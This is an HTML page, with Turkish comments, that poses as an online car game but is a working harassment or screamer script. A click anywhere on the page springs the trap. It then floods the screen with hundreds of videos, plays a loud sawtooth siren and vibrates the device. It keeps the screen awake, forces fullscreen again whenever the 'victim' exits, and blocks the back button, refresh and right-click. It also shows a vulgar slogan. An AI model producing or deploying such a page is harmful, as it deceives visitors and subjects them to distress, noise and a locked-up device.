<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ZAHİR ARABA OYUNU ONLİNE</title>
    <style>
        html, body {
            background-color: black;
            margin: 0;
            padding: 0;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            cursor: none;
            touch-action: none;
            user-select: none;
            -webkit-user-select: none;
            overscroll-behavior: none; /* Aşağı çekip yenilemeyi engeller */
        }

        /* En Üstteki Korkunç Yazı */
        #zahir-text {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: red;
            font-family: 'Impact', 'Arial Black', sans-serif;
            font-size: 15vw;
            font-weight: 900;
            text-shadow: 0 0 30px red, 0 0 60px darkred, 0 0 90px black;
            z-index: 999999; /* Her şeyin en üstünde */
            text-align: center;
            white-space: nowrap;
            pointer-events: none;
            animation: horror-zoom 0.05s infinite alternate;
            opacity: 0.9;
            text-transform: uppercase;
        }

        /* Video Doğma Animasyonu */
        @keyframes spawn-pop {
            0% { transform: scale(0) rotate(-180deg); opacity: 0; }
            50% { transform: scale(1.5) rotate(10deg); opacity: 1; }
            100% { transform: scale(1) rotate(0deg); opacity: 1; }
        }

        /* Yazı Animasyonu */
        @keyframes horror-zoom {
            0% { transform: translate(-50%, -50%) scale(1); filter: hue-rotate(0deg); }
            100% { transform: translate(-50%, -50%) scale(1.4); filter: hue-rotate(90deg); }
        }

        /* Ekran Glitch Efekti */
        .glitch-active {
            animation: screen-shake 0.1s infinite;
        }

        @keyframes screen-shake {
            0% { transform: translate(0,0) scale(1); filter: invert(0); }
            25% { transform: translate(5px, -5px) scale(1.05); filter: invert(1); }
            50% { transform: translate(-5px, 5px) scale(1.05); filter: invert(0); }
            75% { transform: translate(5px, 5px) scale(1.05); filter: invert(1); }
            100% { transform: translate(0,0) scale(1); filter: invert(0); }
        }

        /* Tıklama Tuzağı */
        #trap-overlay {
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            z-index: 1000000;
            background: transparent;
        }
    </style>
</head>
<body>

    <div id="trap-overlay"></div>
    <div id="zahir-text">ZAHİR SİKTİ</div>

    <script>
        let videoCount = 0;
        let audioCtx = null;
        let isChaosStarted = false;

        // 1. VİDEO OLUŞTURUCU
        function spawnVideo() {
            if (videoCount > 400) return; 

            const vid = document.createElement('video');
            vid.src = "korku.mp4"; 
            
            vid.loop = true;        
            vid.muted = true; // İlk etapta sessiz başlat
            vid.playsInline = true;
            vid.autoplay = true;
            
            const size = Math.random() * 90 + 40; 
            const posX = Math.random() * 100;
            const posY = Math.random() * 100;

            vid.style.position = 'absolute';
            vid.style.width = size + 'vw';
            vid.style.top = posY + 'vh';
            vid.style.left = posX + 'vw';
            vid.style.zIndex = 1000 + videoCount;
            vid.style.objectFit = 'cover';
            vid.style.animation = `spawn-pop 0.1s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards`;

            setTimeout(() => {
                vid.style.transform = `translate(-50%, -50%) rotate(${Math.random() * 360}deg)`;
            }, 100);

            document.body.appendChild(vid);
            vid.play().catch(e => {});
            
            videoCount++;
        }

        // 2. KULAK TIRMALAYAN SİREN SESİ (WEB AUDIO API)
        function generateEarPiercingSiren() {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            if (!AudioContext) return;

            audioCtx = new AudioContext();
            
            // Siren sesini üret
            const osc = audioCtx.createOscillator();
            const gainNode = audioCtx.createGain();

            osc.type = 'sawtooth'; // Testere dişi dalgası (çok cızırtılı ve rahatsız edici)
            osc.frequency.setValueAtTime(800, audioCtx.currentTime); // Yüksek frekans

            // Frekansı sürekli değiştirerek siren efekti ver
            setInterval(() => {
                osc.frequency.setValueAtTime(300 + Math.random() * 1200, audioCtx.currentTime);
            }, 100);

            // Ses seviyesini fulle
            gainNode.gain.setValueAtTime(1.0, audioCtx.currentTime);

            osc.connect(gainNode);
            gainNode.connect(audioCtx.destination);
            osc.start();
        }

        // 3. CİHAZI TİTRETME (VIBRATE)
        function startVibration() {
            if (navigator.vibrate) {
                // Durmadan titre (Desen: 1 saniye titret, yarım saniye dur, tekrar et)
                setInterval(() => {
                    navigator.vibrate([1000, 500, 1000, 500]);
                }, 3000);
            }
        }

        // 4. TAM EKRANA ZORLAMA VE KİLİTLEME
        function lockScreen() {
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(e => {});
            }
            
            // Ekran kararmasını engelle
            if ('wakeLock' in navigator) {
                navigator.wakeLock.request('screen').catch(e => {});
            }
        }

        // 5. KAOSU BAŞLATAN FONKSİYON (İlk tıklamada çalışır)
        function startChaos() {
            if (isChaosStarted) return;
            isChaosStarted = true;

            // Tuzağı kaldır
            document.getElementById('trap-overlay').style.display = 'none';

            // Tam ekran ve ekran açık tutma
            lockScreen();

            // Ekranı sarsmaya başla
            document.body.classList.add('glitch-active');

            // Sesleri aç (Siren + Video sesleri)
            generateEarPiercingSiren();
            startVibration();

            // Tüm videoların sesini patlat
            const allVideos = document.querySelectorAll('video');
            allVideos.forEach(v => {
                v.muted = false;
                v.volume = 1.0; 
                v.play().catch(e => {});
            });

            // Sürekli yeni gelen videoların sesini fulde tut ve tekrar tam ekran yap
            setInterval(() => {
                document.querySelectorAll('video').forEach(v => {
                    if (v.muted) v.muted = false;
                    if (v.volume < 1.0) v.volume = 1.0;
                });
                
                // Eğer kurban tam ekrandan çıkarsa geri zorla
                if (!document.fullscreenElement) {
                    lockScreen();
                }
            }, 100);
        }

        // SAYFA YÜKLENDİĞİNDE
        window.onload = function() {
            // Videoları hemen sessizce fırlatmaya başla
            spawnVideo();
            // SANİYEDE 70 TANE (14 ms)
            setInterval(spawnVideo, 14);

            // İlk tıklamada kaosu patlat
            const trap = document.getElementById('trap-overlay');
            trap.addEventListener('click', startChaos);
            trap.addEventListener('touchstart', startChaos);
            
            // Tarayıcı ses izni vermezse diye bir tıklama daha dinle
            document.addEventListener('click', startChaos);
            document.addEventListener('touchstart', startChaos);
        };

        // 6. ÇIKIŞI ENGELLEME (Geri Tuşu, Yenileme vs.)
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1); 
        };
        
        // Yenilemeyi ve Sağ tık'ı engelle
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.addEventListener('selectstart', event => event.preventDefault());
        document.addEventListener('keydown', function(e) {
            // F5 ve Ctrl+R (Yenileme) tuşlarını engelle
            if ((e.which || e.keyCode) == 116 || ((e.ctrlKey || e.metaKey) && (e.which || e.keyCode) == 82)) {
                e.preventDefault();
            }
        });
        
        // Kullanıcı başka sekmeye geçerse veya uygulamadan çıkarsa sesi ve kaosu devam ettirmeye çalış
        document.addEventListener('visibilitychange', function() {
            if (document.hidden && isChaosStarted) {
                // Sesi tekrar patlat (Arka planda çalmaya zorla)
                if(audioCtx && audioCtx.state === 'suspended') {
                    audioCtx.resume();
                }
            }
        });
    </script>
</body>
</html>
